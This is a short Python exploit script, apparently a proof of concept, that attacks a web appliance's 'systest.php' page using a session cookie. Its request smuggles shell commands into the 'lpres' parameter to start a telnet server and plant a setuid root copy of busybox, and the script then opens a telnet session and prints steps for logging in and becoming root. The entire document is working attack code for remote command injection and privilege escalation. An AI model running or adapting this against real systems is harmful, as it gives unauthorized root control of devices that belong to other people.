from StringIO import StringIO
import pycurl
import os

sessid = "1111111111"
target = "192.168.0.10"

durl = "https://" + target + "/systest.php?lpres=;%20/usr/
sbin/telnetd%20;%20cp%20/bin/busybox%20/tmp/su%20;%20chmod%
206755%20/tmp/su%20;"

storage = StringIO()
c = pycurl.Curl()
c.setopt(c.URL, durl)
c.setopt(c.SSL_VERIFYPEER,0)
c.setopt(c.SSL_VERIFYHOST,0)
c.setopt(c.WRITEFUNCTION,storage.write)
c.setopt(c.COOKIE,'avctSessionId=' + sessid)

try:
        print "[*] Sending GET to " + target + " with session id " + sessid
+ "..."
        c.perform()
        c.close()
except:
        print ""
finally:
        print "[*] Done"
print "[*] Trying telnet..."
print "[*] Login as target/target, then do /tmp/su - and enter password
\"root\""
os.system("telnet " + target)
